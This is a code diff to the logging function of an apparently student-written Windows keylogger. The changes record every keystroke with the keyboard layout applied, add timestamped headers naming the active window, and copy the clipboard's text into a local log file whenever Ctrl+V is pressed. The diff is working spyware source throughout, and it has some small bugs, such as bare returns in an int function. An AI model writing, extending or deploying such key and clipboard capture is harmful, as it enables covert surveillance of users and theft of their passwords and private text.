@@ -12,17 +12,26 @@ HWND currentWindow;
 
 char* handleSpecialCase(DWORD vkCode);
 int openOrCreateFile(char* filename);
+int getFolderStringLength (TCHAR* str);
 
 int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
 {
     HANDLE hFile;
-    DWORD dwBytesToWrite;
     DWORD dwBytesWritten;
-    BOOL bErrorFlag = FALSE;
-    char keyString[20];
-    char filename[] = "c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\logs.txt";
+    char charString[1024] = {0};
+    TCHAR modulePath[MAX_PATH];
+    TCHAR moduleFolder[MAX_PATH];
+    TCHAR logsPath[MAX_PATH];
 
-    hFile = openOrCreateFile(filename);
+    if(!GetModuleFileName(NULL, modulePath, MAX_PATH))
+    {
+        printf("Cannot install service (%d)\n", GetLastError());
+        return;
+    }
+    strncpy_s(moduleFolder, MAX_PATH, modulePath, getFolderStringLength(modulePath));
+    snprintf(logsPath, MAX_PATH, "%s\\logs.txt", moduleFolder);
+
+    hFile = openOrCreateFile(logsPath);
     if (hFile == INVALID_HANDLE_VALUE)
         return -1;
 
@@ -40,19 +49,15 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
             SYSTEMTIME st;
             GetLocalTime(&st);
             PSTR header = LocalAlloc(LMEM_ZEROINIT, cTxtLen + 1024);
-            snprintf(header, cTxtLen + 1024, "\n[%s] - %02d:%02d\n", windowTitle, st.wHour, st.wMinute);
+            snprintf(header, cTxtLen + 1024, "\n[%02d.%02d.%02d %02d:%02d:%02d] - '%s'\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, cTxtLen == 1 ? "Desktop" : windowTitle);
             LocalFree(windowTitle); 
-            dwBytesToWrite = strlen(header);
-            dwBytesWritten = 0;
-            bErrorFlag = WriteFile( 
-                            hFile,
-                            header,
-                            dwBytesToWrite,
-                            &dwBytesWritten,
-                            NULL);
+            WriteFile( 
+                hFile,
+                header,
+                strlen(header),
+                &dwBytesWritten,
+                NULL);
             LocalFree(header); 
-            if (FALSE == bErrorFlag)
-                goto handle_error;
         }
     }
 
@@ -60,49 +65,53 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
     char* specialCase = handleSpecialCase(kbdStruct.vkCode);
     if (specialCase == NULL)
     {
-        char c = kbdStruct.vkCode;
         BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
-        if (!useUpperCase)
-        {
-            c = tolower(c);
-        }
-        keyString[0] = c;
-        keyString[1] = '\0';
+        DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
+        BYTE keyboardState[256];
+        // tounicode doesn't work properly if we don't do getkeystate first DONT ASK WHY
+        GetKeyState(VK_SHIFT);
+        GetKeyState(VK_MENU);
+        GetKeyboardState(keyboardState);
+        ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
     }
-    else
+
+    WriteFile( 
+        hFile,
+        specialCase == NULL ? charString : specialCase,
+        specialCase == NULL ? strlen(charString) : strlen(specialCase),
+        &dwBytesWritten,
+        NULL);
+
+    // If a control key + v is pressed, print clipboard to logs
+    if ((GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL)) && kbdStruct.vkCode == 86)
     {
-        strcpy_s(keyString, sizeof keyString, specialCase);
-    }
+        HGLOBAL   clipboardData; 
+        LPTSTR    clipboardString;
+        if (!IsClipboardFormatAvailable(CF_TEXT)) 
+            return; 
+        if (!OpenClipboard(foreground)) 
+            return; 
 
-    char charString[16];
-    DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
-    BYTE keyboardState[256];
-    GetKeyboardState(keyboardState);
-    ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
-
-    dwBytesToWrite = strlen(charString);
-    dwBytesWritten = 0;
-    bErrorFlag = WriteFile( 
+        clipboardData = GetClipboardData(CF_TEXT); 
+        if (clipboardData != NULL) 
+        { 
+            clipboardString = GlobalLock(clipboardData); 
+            if (clipboardString != NULL) 
+            { 
+                printf("ADDING %s", clipboardString);
+                WriteFile( 
                     hFile,
-                    charString,
-                    dwBytesToWrite,
+                    clipboardString,
+                    strlen(clipboardString),
                     &dwBytesWritten,
                     NULL);
 
-handle_error:
-    if (FALSE == bErrorFlag)
-    {
-        printf("Terminal failure: Unable to write to file.\n");
-        return -1;
+                GlobalUnlock(clipboardData); 
+            } 
+        } 
+        CloseClipboard(); 
     }
-    else
-    {
-        if (dwBytesWritten != dwBytesToWrite)
-        {
-            printf("Error: dwBytesWritten != dwBytesToWrite\n");
-            return -1;
-        }
-    }
+
     CloseHandle(hFile);
     return 1;
 }
